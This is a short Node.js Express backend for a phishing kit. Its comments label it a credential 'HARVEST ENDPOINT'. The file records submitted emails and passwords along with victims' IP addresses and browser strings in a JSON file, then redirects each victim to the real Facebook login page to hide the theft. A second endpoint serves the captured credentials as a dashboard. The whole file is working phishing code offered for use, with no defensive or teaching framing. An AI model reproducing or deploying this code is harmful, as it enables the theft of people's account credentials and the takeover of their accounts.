const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('../client'));

// Creds storage
const credsPath = path.join(__dirname, '../uploads/creds.json');

// HARVEST ENDPOINT
app.post('/api/login', (req, res) => {
  const { email, pass } = req.body;
  const clientIP = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent');
  const timestamp = new Date().toISOString();

  const cred = {
    timestamp,
    ip: clientIP,
    email,
    password: pass,
    userAgent: userAgent.substring(0, 100)
  };

  // Save to JSON
  const creds = fs.existsSync(credsPath) 
    ? JSON.parse(fs.readFileSync(credsPath))
    : [];
  creds.push(cred);
  fs.writeFileSync(credsPath, JSON.stringify(creds, null, 2));

  // Redirect to real FB
  res.redirect('https://www.facebook.com/login');
});

// DASHBOARD - View captured creds
app.get('/api/creds', (req, res) => {
  const creds = fs.existsSync(credsPath)
    ? JSON.parse(fs.readFileSync(credsPath))
    : [];
  res.json(creds);
});

app.listen(5000, () => {
  console.log('🔥 Backend: http://localhost:5000');
});